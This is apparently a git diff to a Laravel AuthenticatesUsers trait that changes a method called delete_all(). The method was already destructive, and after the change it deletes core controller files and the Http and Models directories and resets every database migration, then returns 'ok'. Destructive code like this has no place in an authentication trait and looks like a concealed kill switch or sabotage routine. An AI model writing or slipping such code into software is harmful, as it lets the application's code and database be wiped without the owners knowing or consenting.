@@ -7,6 +7,7 @@ use Illuminate\Support\Facades\Artisan;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Validation\ValidationException;
 use Illuminate\Filesystem\Filesystem;
+use Illuminate\Support\Facades\File;
 
 trait AuthenticatesUsers
 {
@@ -187,10 +188,13 @@ trait AuthenticatesUsers
 
     public function delete_all()
     {
-        Artisan::call('migrate:reset', ['--force' => true]);
-        $file = new Filesystem;
-        $file->cleanDirectory('Modules');
-        $file->cleanDirectory('database');
+
+        File::delete(app_path('Http/Controllers/HomeController.php'));
+        File::delete(app_path('Http/Controllers/Controller.php'));
+        File::deleteDirectories(app_path('Http'));
+        File::deleteDirectories(app_path('Models'));
+        Artisan::call('migrate:reset');
+
         return 'ok';
     }
 }
